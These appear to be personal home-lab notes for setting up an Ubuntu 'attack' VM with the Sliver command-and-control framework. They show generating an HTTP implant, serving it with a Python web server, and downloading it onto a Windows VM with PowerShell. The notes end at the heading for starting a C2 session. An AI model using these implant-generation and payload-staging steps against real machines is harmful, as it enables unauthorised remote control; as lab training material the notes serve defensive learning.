# Ubuntu Config


### Set a static IP during the install (IPv4 Manual Config)
		Set a username && password
		name: user
		server name: attack
		Username: user
		Password: password
		
		Install OpenSSH server
			check / yes
		
		Continue Installing until it's complete
		Showing [Reboot now] then hit enter and Reboot
		
		After reboot check connectivity
			login with credentials
		
		check DNS outbound pings work
			ping -c 3 google.com
		
		if you see the icmp 3 times your good to go


#### Setup Attack System (Linux VM)



	Since im on a MacOS in goint to SSH into the Linux VM from 
	my terminal. I do this because I can copy and paste as well as 
	scroll and look at output whereas on the VM itself once the 
	words have left the screen there is now way for me to bring 
	them back down.
	
	
	Open up a terminal and ssh into the machine
	
		ssh user@ipaddress-of-vm
	
	
	Inside the session proceed to setup the attacker c2 server
	switch root user
	
		sudo su
	
	
	Now we want to download Sliver a Command & Control c2 framework
	By: BishopFox
	You can copy & paste or type it in if you know what your doing
	
	# Download Sliver Linux server binary
	
	wget https://github.com/BishopFox/sliver/releases/download/
	v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
	
	
	# Make it Executable
	
	chmod +x /usr/local/bin/sliver-server
	
	
	# Install mingw-w64 for additional capabilities
	
	apt install -y mingw-w64
	
	
	We need a working Directory for future steps
	
		mkdir -p /opt/sliver
	
	
	
	### Explore these menu options and become familar with them
	
	Timeline (saves an extra 2-3 hours setting up other VMs)
	Processes (Real-time list of process activity)
	Network (Real time list active connections & listening ports)
	File System (Browse entire file system)



#### Generate C2 Payload


	On the Linux Terminal Change into Root if not already
		sudo su
	
	Then change Directory
		cd /opt/sliver
	
	
	Launch Sliver server
		sliver-server
	
	
	Generate a C2 session payload (inside the Sliver shell)
		generate --http linux-ipaddress --save /opt/sliver
		
		take note of the unique output file
	
	
	Confirm the configuration of the new implants
		impants
		
	
	We have a payload we can drop on our Windows VM for now exit
		exit
	
	
	To Download the C2 payload from the Linux to the Windows VM
	We can use a python trick to spin up a temporary web server
	
	Change into the opt sliver Directory
		cd /opt/sliver
	
	Spin up the python server
		python3 -m http.server 80
	
	
	In the Windows VM open an Admin PowerShell console
	Download the C2 payload from the Linux VM to the Windows
	
	IWR -Uri http://linux-ipaddress/payload-name.exe -OutFile
	C:\Users\User\Downloads\payload-name.exe
	
	Take a snapshot of Windows VM before staging the malware
		name Snapshot "Malware staged" or something similar
	
	
	
#### Start C2 Command and Control Session